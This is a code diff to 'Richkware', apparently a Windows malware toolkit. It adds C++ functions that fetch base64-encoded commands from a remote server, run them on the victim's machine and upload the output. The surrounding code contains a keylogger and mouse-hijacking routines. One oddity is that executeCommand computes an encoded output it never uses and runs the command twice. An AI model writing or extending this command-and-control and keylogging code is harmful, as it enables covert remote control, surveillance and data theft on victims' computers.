@@ -90,6 +90,32 @@ void Richkware::RandMouse() {
     SetCursorPos((rand() % horizontal + 1), (rand() % vertical + 1));
 }
 
+std::vector<std::string> Richkware::getCommands() {
+    std::string commands = network.fetchCommand();
+    std::string decodedCommands = Base64_decode(commands);
+    std::vector<std::string> commandList;
+    std::vector<std::string> result;
+    //decrypt string
+//    Crypto crypto(encryptionKey);
+//    if (!commands.empty()) {
+//        std::string decryptedCommands = crypto.Decrypt(commands);
+    commandList = utils::split(decodedCommands, "##");
+//        return commandList;
+//    }
+    //decode single commands
+    for (size_t i = 0; i < commandList.size(); ++i) {
+        std::string temp = Base64_decode(commandList.at(i));
+        result.push_back(temp);
+    }
+    return result;
+}
+
+std::string Richkware::executeCommand(std::string command) {
+    //encrypt the output of the command
+    std::string output = CodeExecution(command);
+    std::string encodedOutput = Base64_encode((const unsigned char *) output.c_str(), output.size());
+    return CodeExecution(command).c_str();
+}
 
 void Richkware::Keylogger(const char *fileName) {
     HANDLE hBlockAppsTh = CreateThread(0, 0, &KeyloggerThread, (void *) fileName, 0, 0);
@@ -105,6 +131,10 @@ void Richkware::Hibernation() {
     SendMessage(HWND_BROADCAST,
                 WM_SYSCOMMAND,
                 SC_MONITORPOWER, (LPARAM) 2);
+}
+
+void Richkware::uploadCommandsResponse(std::string output) {
+    network.uploadCommand(output);
 }
 
 
